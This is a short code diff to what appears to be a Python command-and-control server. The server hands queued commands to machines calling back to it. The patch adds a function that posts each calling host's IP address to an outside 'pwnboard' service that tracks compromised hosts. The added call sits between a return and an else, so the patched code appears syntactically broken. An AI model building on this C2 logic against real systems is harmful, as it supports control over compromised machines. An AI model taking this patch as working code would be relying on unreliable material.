@@ -36,6 +36,7 @@ def process_callbacks(ip, typ):
             c = f.read()
             os.remove(com_file)
             return c + "\n"
+    updatePwnboard(ip, typ)
     else:
         return "#lmao\n" 
 
@@ -143,6 +144,19 @@ def show_win_action_log():
     with open("/tmp/cc/windows/tasks.log", 'r') as f:
         s = f.read()
         return s
+
+
+def updatePwnboard(ip, typ):
+    tstr = "CC: {}".format(typ)
+    host = os.environ.get("PWNBOARD_URL", "https://pwnboard.win/generic")
+    data = {'ip': ip, 'type': tstr}
+    try:
+        req = requests.post(host, json=data, timeout=3)
+        return True
+    except Exception as E:
+        print("Cannot update pwnboard: {}".format(E))
+        return False
+
 
 
 if __name__ == '__main__':
